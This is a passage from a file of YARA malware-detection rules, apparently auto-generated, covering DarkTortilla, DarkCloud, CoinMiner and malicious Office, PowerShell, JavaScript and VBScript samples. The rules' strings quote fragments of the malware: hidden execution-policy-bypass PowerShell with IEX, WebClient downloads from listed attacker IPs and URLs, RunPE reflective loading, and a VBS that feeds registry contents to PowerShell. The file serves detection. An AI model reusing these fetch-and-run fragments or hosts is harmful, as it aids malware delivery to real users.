      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule e41c25ab7824b3df73334188c40518ae_imphash_ {
   meta:
      description = "_subset_batch - file e41c25ab7824b3df73334188c40518ae(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "113e50d661b8adb166d077fe0052331e0913973f0bac0d8e93999c9a094dce0a"
   strings:
      $s1 = "* wQ\"4" fullword ascii /* score: '9.00'*/
      $s2 = "* 8%6&}" fullword ascii /* score: '9.00'*/
      $s3 = "%tzJWR%D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule DarkTortilla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DarkTortilla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9e2267735d0702b3b42f9ba72053a19931fd2c06ffd4b32f1698fdef23412a19"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "valorising.exe" fullword wide /* score: '22.00'*/
      $s4 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s5 = "en des Programms Kurbelschwinge.exe" fullword wide /* score: '19.00'*/
      $s6 = "ber das Programm Kurbelschwinge.exe" fullword wide /* score: '19.00'*/
      $s7 = "C:\\Ablage\\Kurbelschwinge.svg" fullword wide /* score: '16.00'*/
      $s8 = "Select * from vms_datakey where ticketkey=@tik and tahunkey=@th" fullword wide /* score: '14.00'*/
      $s9 = " group by material, batch_prod,tiket1,tiket2,tiket3,tiket4,tiket5, idinput1,idinput2,idinput3,idinput4,idinput5,take1,take2,take" wide /* score: '13.00'*/
      $s10 = "Bitte X- und Y-Koordinate des Drehpunktes der Kurbel, durch Leerzeichen getrennt, eingeben." fullword wide /* score: '13.00'*/
      $s11 = "Bitte X- und Y-Koordinate des Drehpunktes der Schwinge, durch Leerzeichen getrennt, eingeben." fullword wide /* score: '13.00'*/
      $s12 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s13 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s14 = "eTd6J1pw0" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s15 = "Getriebe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule c3f451354de6fe675f1c756733208fc6739ebb3603449b68a1c41419d952944b_c3f45135 {
   meta:
      description = "_subset_batch - file c3f451354de6fe675f1c756733208fc6739ebb3603449b68a1c41419d952944b_c3f45135.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c3f451354de6fe675f1c756733208fc6739ebb3603449b68a1c41419d952944b"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "https://getabre.com/GJa61u" fullword wide /* score: '22.00'*/
      $s3 = "C:\\Program Files\\Microsoft Office\\OFFICE11\\EXCEL.EXE" fullword wide /* score: '21.00'*/
      $s4 = "9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applications" fullword wide /* score: '21.00'*/
      $s5 = "HA TINH BRANCH - Vinfast Trading And Production Joint Stock Company@" fullword ascii /* score: '17.00'*/
      $s6 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s7 = "ALEJANDRO" fullword ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s8 = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" fullword wide /* reversed goodware string 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' */ /* score: '16.50'*/
      $s9 = "DDDDDDDDDDDDDDDDD" wide /* reversed goodware string 'DDDDDDDDDDDDDDDDD' */ /* score: '16.50'*/
      $s10 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide /* score: '13.00'*/
      $s11 = "HERRERO - SOLDADOR" fullword ascii /* score: '12.00'*/
      $s12 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s13 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
      $s14 = "CRIZOLOGO" fullword ascii /* score: '11.50'*/
      $s15 = "LOGISTICO" fullword ascii /* score: '11.50'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule dc107c30d0dbd8d7279c03f4242ec4e66aa94213365ef60f0e38018bff41f997_dc107c30 {
   meta:
      description = "_subset_batch - file dc107c30d0dbd8d7279c03f4242ec4e66aa94213365ef60f0e38018bff41f997_dc107c30.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc107c30d0dbd8d7279c03f4242ec4e66aa94213365ef60f0e38018bff41f997"
   strings:
      $x1 = "C:\\Users\\Utente\\AppData\\Local\\Temp\\Articolo.vbe" fullword wide /* score: '33.00'*/
      $x2 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE14\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $s3 = "C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA7\\VBE7.DLL" fullword ascii /* score: '29.00'*/
      $s4 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.5#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE14\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s5 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.1#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA7\\VBE7.DLL#Visual Basic F" fullword wide /* score: '25.00'*/
      $s6 = "C:\\tpm\\Articolo.exe" fullword ascii /* score: '24.00'*/
      $s7 = "C:\\tpm\\Avviso.exe" fullword wide /* score: '24.00'*/
      $s8 = "Avviso.exe" fullword wide /* score: '22.00'*/
      $s9 = "WScript.Shell" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s10 = "VBE7.DLL" fullword ascii /* score: '20.00'*/
      $s11 = "http://199.103.63.221/progsKK/Articolo.txt" fullword ascii /* score: '19.00'*/
      $s12 = "http://199.103.63.221/progsKK/Avviso.txt" fullword wide /* score: '19.00'*/
      $s13 = "Scripting.FileSystemObject" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s14 = "http://www.scuolaelementarediorziveccho.191.it/Public/Articolo.txt" fullword ascii /* score: '17.00'*/
      $s15 = "http://www.scuolaelementarediorziveccho.191.it/Public/Avviso.txt" fullword wide /* score: '17.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule eccda593bbc09fb143ebd05d1a6116cfb45a61f9e86477d7e33402719bb4c856_eccda593 {
   meta:
      description = "_subset_batch - file eccda593bbc09fb143ebd05d1a6116cfb45a61f9e86477d7e33402719bb4c856_eccda593.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eccda593bbc09fb143ebd05d1a6116cfb45a61f9e86477d7e33402719bb4c856"
   strings:
      $s1 = "xyy!!!" fullword ascii /* score: '10.00'*/
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 500KB and
      all of them
}

rule b42e7b054e331eeefe398263b73299b0279ec75cc90d93c82a86a2de700ecfd4_b42e7b05 {
   meta:
      description = "_subset_batch - file b42e7b054e331eeefe398263b73299b0279ec75cc90d93c82a86a2de700ecfd4_b42e7b05.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b42e7b054e331eeefe398263b73299b0279ec75cc90d93c82a86a2de700ecfd4"
   strings:
      $x1 = "$SvGNFlO_SP = 'NAA2AGUAcwBhAGIAPQAjAHUAcAAjAHUAbwAmADAAMQA9ACMAbgB1AG8AYwBfAHgAaQBmAGUAcgBwACYARgBOAD0AeABpAGYAZQByAHAAJgA3ADMAM" ascii /* score: '48.00'*/
      $s2 = "update-codec-browser/48502c50-a504-4811-aab8-ba978aeae237', 'C:\\Users\\Public\\Downloads', 'CodecWorker', 'js', $true));" fullword ascii /* score: '30.00'*/
      $s3 = "alomadrido2025/tragira.jpg';$Guherb = New-Object System.Net.WebClient;$Guherb.Headers.Add('User-Agent','Mozilla/5.0');$hXkfvXP_s" ascii /* score: '27.00'*/
      $s4 = "B - $BIdFnX;$Ot_mbDv = $wPHGyrkUoPmy.Substring($BIdFnX, $cblAiEpBTuJviI);$MQyikjtu_mPKPls = [System.Convert]::FromBase64String($" ascii /* score: '19.00'*/
      $s5 = "KPls);[RunPE.Runner].GetMethod('VAI').Invoke($null, [object[]] @($KhHmeJHSsn, '', 'EdgeBrowserCodec', 'https://lojinhadaana.org/" ascii /* score: '18.00'*/
      $s6 = "g([System.Convert]::FromBase64String($SvGNFlO_SP)) -replace '#','t';[System.Diagnostics.Debug]::WriteLine('[PWS] Started PWS scr" ascii /* score: '15.00'*/
      $s7 = "mjKgqp = $Guherb.DownloadData($GhqEFvSJW);$mBLeqKRbdcJ = $Guherb.DownloadData($H_IlooxTKi_bzkrR);$FSqrvXQNXQnKsxC = [System.Text" ascii /* score: '13.00'*/
      $s8 = ".Encoding]::UTF8.GetString($mBLeqKRbdcJ);$wPHGyrkUoPmy = [System.Text.Encoding]::UTF8.GetString($hXkfvXP_smjKgqp);$cYUWQKmQO_Hw " ascii /* score: '12.00'*/
      $s9 = "gBlAGEAZQBhADgANwA5AGEAYgAtADgAYgBhAGEALQAxADEAOAA0AC0ANAAwADUAYQAtADAANQBjADIAMAA1ADgANAA9AGQAYQBvAGwAeQBhAHAAPwBlACMAYQByAGUAb" ascii /* score: '11.00'*/
      $s10 = "ipt...');$H_IlooxTKi_bzkrR = $trlxdhm[-1..-($trlxdhm.Length)] -join '';$GhqEFvSJW = 'https://ia801003.us.archive.org/24/items/re" ascii /* score: '9.00'*/
      $s11 = "gBlAGcALwBnAHIAbwAuAGEAbgBhAGEAZABhAGgAbgBpAGoAbwBsAC8ALwA6AHMAcAAjACMAaAA=';$trlxdhm = [System.Text.Encoding]::Unicode.GetStrin" ascii /* score: '8.00'*/
      $s12 = "xOf($FNp_pWMi);$BIdFnX -ge 0 -and $ddSs_nFuYFjLmuB -gt $BIdFnX;$BIdFnX += $cYUWQKmQO_Hw.Length;$cblAiEpBTuJviI = $ddSs_nFuYFjLmu" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5324 and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule de47e5293e21a9d4cea98810ad00012ed559c22edc0bf0fa27462b7ebe2f0a14_de47e529 {
   meta:
      description = "_subset_batch - file de47e5293e21a9d4cea98810ad00012ed559c22edc0bf0fa27462b7ebe2f0a14_de47e529.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de47e5293e21a9d4cea98810ad00012ed559c22edc0bf0fa27462b7ebe2f0a14"
   strings:
      $x1 = "$MD_pgEtmba = 'NAA2AGUAcwBhAGIAPQAjAHUAcAAjAHUAbwAmADAAMQA9ACMAbgB1AG8AYwBfAHgAaQBmAGUAcgBwACYARgBOAD0AeABpAGYAZQByAHAAJgA3ADMAM" ascii /* score: '48.00'*/
      $s2 = " '', 'EdgeBrowserCodec', 'https://lojinhadaana.org/update-codec-browser/48502c50-a504-4811-aab8-ba978aeae237', 'C:\\Users\\Publi" ascii /* score: '30.00'*/
      $s3 = "ms/realomadrido2025/tragira.jpg';$MSnwvHawpQYFoR = New-Object System.Net.WebClient;$MSnwvHawpQYFoR.Headers.Add('User-Agent','Moz" ascii /* score: '27.00'*/
      $s4 = "g([System.Convert]::FromBase64String($MD_pgEtmba)) -replace '#','t';[System.Diagnostics.Debug]::WriteLine('[PWS] Started PWS scr" ascii /* score: '20.00'*/
      $s5 = "diFlTjCK);$QdjcXuYAeoatVHXC = [System.Text.Encoding]::UTF8.GetString($whNEqkWfVhmafQ);$tyXGqRfUhabhFzXs = [System.Text.Encoding]" ascii /* score: '12.00'*/
      $s6 = "tviVv += $LkNqKZqLTDeguwg.Length;$rlWgyzjUSJVdhu = $ldVzoBmPwMkR - $nUqatviVv;$jFFulLf = $tyXGqRfUhabhFzXs.Substring($nUqatviVv," ascii /* score: '12.00'*/
      $s7 = "ngth)] -join '';[System.Reflection.Assembly]::Load($kezXUF);[RunPE.Runner].GetMethod('VAI').Invoke($null, [object[]] @($lHIpqBP," ascii /* score: '12.00'*/
      $s8 = "gBlAGEAZQBhADgANwA5AGEAYgAtADgAYgBhAGEALQAxADEAOAA0AC0ANAAwADUAYQAtADAANQBjADIAMAA1ADgANAA9AGQAYQBvAGwAeQBhAHAAPwBlACMAYQByAGUAb" ascii /* score: '11.00'*/
      $s9 = "illa/5.0');$BghksYSJYWA = $MSnwvHawpQYFoR.DownloadData($zoZWBDduaejHCkk);$whNEqkWfVhmafQ = $MSnwvHawpQYFoR.DownloadData($lsuxNhV" ascii /* score: '10.00'*/
      $s10 = "Downloads', 'CodecWorker', 'js', $true));" fullword ascii /* score: '10.00'*/
      $s11 = "ipt...');$lsuxNhVdiFlTjCK = $gjDxFXy[-1..-($gjDxFXy.Length)] -join '';$zoZWBDduaejHCkk = 'https://ia801003.us.archive.org/24/ite" ascii /* score: '9.00'*/
      $s12 = "::UTF8.GetString($BghksYSJYWA);$LkNqKZqLTDeguwg = '<<@R9t!Zx#Qv';$eVeuYFb = '!mX7#Lp@^2Kd';$nUqatviVv = $tyXGqRfUhabhFzXs.IndexO" ascii /* score: '9.00'*/
      $s13 = "gBlAGcALwBnAHIAbwAuAGEAbgBhAGEAZABhAGgAbgBpAGoAbwBsAC8ALwA6AHMAcAAjACMAaAA=';$gjDxFXy = [System.Text.Encoding]::Unicode.GetStrin" ascii /* score: '8.00'*/
      $s14 = "f($LkNqKZqLTDeguwg);$ldVzoBmPwMkR = $tyXGqRfUhabhFzXs.IndexOf($eVeuYFb);$nUqatviVv -ge 0 -and $ldVzoBmPwMkR -gt $nUqatviVv;$nUqa" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4d24 and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule b6699ba6eee52dfa10d2faa4997d07cffcb539bea176f8ac98124301c5f1bb34_b6699ba6 {
   meta:
      description = "_subset_batch - file b6699ba6eee52dfa10d2faa4997d07cffcb539bea176f8ac98124301c5f1bb34_b6699ba6.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6699ba6eee52dfa10d2faa4997d07cffcb539bea176f8ac98124301c5f1bb34"
   strings:
      $s1 = "function a(){var x=['Bw92zu5LEhq','qurpreiUu3rYzwfT','mJi1mLr6uMP1sq','u2XLzxa','mtiZnJq4m3PjshLgCW','q29WEq','q3jLyxrLt2jQzwn0'" ascii /* score: '27.00'*/
      $s2 = "e)](s(0xc1)),f=c['ExpandEnvironmentStrings'](s(0xc9)),g='http://198.55.98.29/host/Stein.zip',h=d[s(0xd3)](f,j(0x6)+s(0xc5)),i=d[" ascii /* score: '20.00'*/
      $s3 = "(0xd8));p[w(0xbd)](q),p['Delete'](),c[w(0xc3)]('\\x22'+q+'\\x22',0x1,![]);break;}o[w(0xb8)]();}}try{k(g,h)&&(l(h,i)&&(WScript[s(" ascii /* score: '10.00'*/
      $s4 = "urn decodeURIComponent(p);};b['ZbvOat']=i,c=arguments,b['FyiJYe']=!![];}var j=e[0x0],k=f+j,l=c[k];return!l?(h=b['ZbvOat'](h),c[k" ascii /* score: '9.00'*/
      $s5 = ";for(var q=0x0,r,s,t=0x0;s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=String['fromCharCode'](0xff&r>>(-0x2*q&0x6)):0x0" ascii /* score: '9.00'*/
      $s6 = ",q['Close'](),!![];}function l(n,o){var v=s,p=WScript[v(0xbe)]('Shell.Application'),q=p[v(0xdc)](n);if(!q)return![];if(!d[v(0xde" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      all of them
}

rule b6cdb9196db801ed852b6873c7e4de37e3e3d6dda058bf208d4efaf5435be91b_b6cdb919 {
   meta:
      description = "_subset_batch - file b6cdb9196db801ed852b6873c7e4de37e3e3d6dda058bf208d4efaf5435be91b_b6cdb919.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6cdb9196db801ed852b6873c7e4de37e3e3d6dda058bf208d4efaf5435be91b"
   strings:
      $x1 = "powershell  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command     \"$decoded=[System.Text.Encoding]::UTF8.GetStrin" ascii /* score: '41.00'*/
      $x2 = "powershell  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command     \"$decoded=[System.Text.Encoding]::UTF8.GetStrin" ascii /* score: '32.00'*/
      $s3 = "JICxzZ2FsZiB0bml1ICxtYXJhcCBydFB0bkkgLHRyYXRzIHJ0UHRuSSAsa2NhdHMgdG5pdSAscnR0YSBydFB0bkkgLGggcnRQdG5JKGRhZXJoVGV0b21lUmV0YWVyQyB" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s4 = "ldHliICxyZGRhIHJ0UHRuSSAsaCBydFB0bkkoeXJvbWVNc3NlY29yUGV0aXJXIGxvb2IgbnJldHhlIGNpdGF0cyBjaWxidXAgXSkibGxkLjIzbGVucmVrIih0cm9wbUl" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s5 = ".-($decoded.Length)]; IEX $reversed; Read-Host 'Press Enter to exit...'\"" fullword ascii /* score: '13.00'*/
      $s6 = "kID0gRElQdGVncmF0JAoNKWVkb2NsbGVoU3BtZXQkKHNldHlCbGxBZGFlUjo6XWVsaUYuT0kubWV0c3lTWyA9IGVkb2NsbGVocyQKDQoNMDA1IHNkbm9jZXNpbGxpTS0" ascii /* score: '11.00'*/
      $s7 = "gcGVlbFMtdHJhdFMKDXVyaFRzc2FQLSBuZWRkaUggZWx5dFN3b2RuaVctICJleGUubGxlaHNyZXdvcCIgaHRhUGVsaUYtIHNzZWNvclAtdHJhdFMgPSBwJAoNCg1AIgo" ascii /* score: '11.00'*/
      $s8 = "yZVNwb3JldG5JLmVtaXRudVIubWV0c3lTIGduaXN1Cg07c2NpdHNvbmdhaUQubWV0c3lTIGduaXN1Cg07bWV0c3lTIGduaXN1Cg0iQCBub2l0aW5pZmVEZXB5VC0gZXB" ascii /* score: '11.00'*/
      $s9 = "([System.Convert]::FromBase64String('Cg0pY29yUGgkKGVsZG5hSGVzb2xDOjpdcm90Y2VqbklbXWRpb3ZbCg0pb3JlWjo6XXJ0UHRuSVsgLDAgLG9yZVo6Ol1" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule b6eb1754da432c40a940fe999287175aa4b2462a02a367f30e6964c4c8a4372b_b6eb1754 {
   meta:
      description = "_subset_batch - file b6eb1754da432c40a940fe999287175aa4b2462a02a367f30e6964c4c8a4372b_b6eb1754.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6eb1754da432c40a940fe999287175aa4b2462a02a367f30e6964c4c8a4372b"
   strings:
      $x1 = "powershell.exe  -c iex (-join [char[]]@(112,111,119,101,114,115,104,101,108,108,32,45,69,110,99,111,100,101,100,67,111,109,109,9" ascii /* score: '31.00'*/
      $x2 = "powershell.exe  -c iex (-join [char[]]@(112,111,119,101,114,115,104,101,108,108,32,45,69,110,99,111,100,101,100,67,111,109,109,9" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*)
}

rule DarkCloud_signature__1e67d2940d71dd2c69b0a1f1192a549d_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_1e67d2940d71dd2c69b0a1f1192a549d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "07b726a37ff33f8f7bf67313ea25d5103b9671dde2de4d2d24dbe7916173e41b"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s5 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s6 = "Description analyzer" fullword ascii /* score: '10.00'*/
      $s7 = "nalyzer" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule ca0aa3669485c241af5166edea379b2a5474452b0d3f0951e0d5db1ccb5616f4_ca0aa366 {
   meta:
      description = "_subset_batch - file ca0aa3669485c241af5166edea379b2a5474452b0d3f0951e0d5db1ccb5616f4_ca0aa366.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ca0aa3669485c241af5166edea379b2a5474452b0d3f0951e0d5db1ccb5616f4"
   strings:
      $s1 = "GenP.v3.5.0-CGP/GenP 3.5.0.exe" fullword ascii /* score: '19.00'*/
      $s2 = "GenP.v3.5.0-CGP/Source Code/config.ini" fullword ascii /* score: '12.00'*/
      $s3 = "GenP.v3.5.0-CGP/Source Code/Skull.ico" fullword ascii /* score: '9.00'*/
      $s4 = "aocmfba" fullword ascii /* score: '8.00'*/
      $s5 = ";.bGb -t" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__102a8536 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_102a8536.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "102a8536a3b1ba08ac040c2a231ed67aaf22fdf12db43c7ba063a82a30e60030"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\OLmyXAgimJ\\src\\obj\\Debug\\kbBL.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s4 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s6 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s7 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s8 = "kbBL.exe" fullword wide /* score: '22.00'*/
      $s9 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s10 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s11 = "get_ProductBarkod" fullword ascii /* score: '9.00'*/
      $s12 = "get_ReceiptID" fullword ascii /* score: '9.00'*/
      $s13 = "get_ReceiptDateTime" fullword ascii /* score: '9.00'*/
      $s14 = "get_ProductPrice" fullword ascii /* score: '9.00'*/
      $s15 = "get_ReceiptMoney" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__8207c83c4af45770be604e6c6e3ee7d1_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_8207c83c4af45770be604e6c6e3ee7d1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7d3989432c31d49150099ebe107a13425ab548e63f8f9064ad54fa10fcf5a877"
   strings:
      $s1 = "* ->6." fullword ascii /* score: '13.00'*/
      $s2 = "\\/>;@4?d" fullword ascii /* score: '10.00'*/ /* hex encoded string 'M' */
      $s3 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s4 = "[{3\\,-,$f" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s5 = " /yyFi8Iy/" fullword ascii /* score: '8.00'*/
      $s6 = "Df8 /ncoxV:!" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      all of them
}

rule CoinMiner_signature__8207c83c4af45770be604e6c6e3ee7d1_imphash__e67eee6b {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_8207c83c4af45770be604e6c6e3ee7d1(imphash)_e67eee6b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e67eee6b1549d46346660e8d1940f5cda965e794f0098d49e2e2889a71a53424"
   strings:
      $s1 = "/dumpsta" fullword ascii /* score: '14.00'*/
      $s2 = "LcLQWJL.jJL" fullword ascii /* score: '10.00'*/
      $s3 = "dIL.eIL}ZcL.eILVeIL" fullword ascii /* score: '10.00'*/
      $s4 = "TcLg.HLf.HL" fullword ascii /* score: '10.00'*/
      $s5 = "mLQaLL?dLL1" fullword ascii /* score: '9.00'*/
      $s6 = "IMLEdlL" fullword ascii /* score: '9.00'*/
      $s7 = "mHLEdlL" fullword ascii /* score: '9.00'*/
      $s8 = "+ -\"VT%s " fullword ascii /* score: '9.00'*/
      $s9 = "#HLS%HL!UcLS%HLo%HLUUcL" fullword ascii /* score: '8.00'*/
      $s10 = "deactiv" fullword ascii /* score: '8.00'*/
      $s11 = " w%CNfX%J9" fullword ascii /* score: '8.00'*/
      $s12 = "oftwareo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule c62ea690698c36abdbe048dbb933b30863014b70a951978517f72d42cdc3b02c_c62ea690 {
   meta:
      description = "_subset_batch - file c62ea690698c36abdbe048dbb933b30863014b70a951978517f72d42cdc3b02c_c62ea690.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c62ea690698c36abdbe048dbb933b30863014b70a951978517f72d42cdc3b02c"
   strings:
      $x1 = "Function IsRunning(n) : IsRunning = (GetObject(\"winmgmts:\\\\.\\root\\cimv2\").ExecQuery(\"SELECT * FROM Win32_Process WHERE Na" ascii /* score: '48.00'*/
      $x2 = "Function IsRunning(n) : IsRunning = (GetObject(\"winmgmts:\\\\.\\root\\cimv2\").ExecQuery(\"SELECT * FROM Win32_Process WHERE Na" ascii /* score: '48.00'*/
      $x3 = "Function GetPS() : Dim p : For Each p In GetObject(\"winmgmts:\").InstancesOf(\"Win32_Process\") : If LCase(p.Name) = \"powershe" ascii /* score: '31.00'*/
      $s4 = "Function GetPS() : Dim p : For Each p In GetObject(\"winmgmts:\").InstancesOf(\"Win32_Process\") : If LCase(p.Name) = \"powershe" ascii /* score: '24.00'*/
      $s5 = "            sh.Run winDir & \"\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\", 2" fullword ascii /* score: '16.00'*/
      $s6 = "Dim sh, winDir, i, j, k, l, m, p : Set sh = CreateObject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
      $s7 = "                With sh : .AppActivate p.ProcessId : .SendKeys .RegRead(\"HKCU\\Software\\yyhywyPdEOQRTob\\\" & k)" fullword ascii /* score: '10.00'*/
      $s8 = "e\" Then : Set GetPS = p : Exit Function : End If : Next : Set GetPS = Nothing : End Function" fullword ascii /* score: '9.00'*/
      $s9 = "    WScript.Sleep 10000 : m = m + 1" fullword ascii /* score: '9.00'*/
      $s10 = "winDir = sh.ExpandEnvironmentStrings(\"%windir%\") : i = \"in\" : j = \"instant\" : k = \"v\" : l = \"cn\" : m = 0" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 3KB and
      1 of ($x*) and all of them
}

rule cddd3f99b7888355e27c3ca20eec65f4f4adc219b84de5ca67cb6e9bc93d19bc_cddd3f99 {
   meta:
      description = "_subset_batch - file cddd3f99b7888355e27c3ca20eec65f4f4adc219b84de5ca67cb6e9bc93d19bc_cddd3f99.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
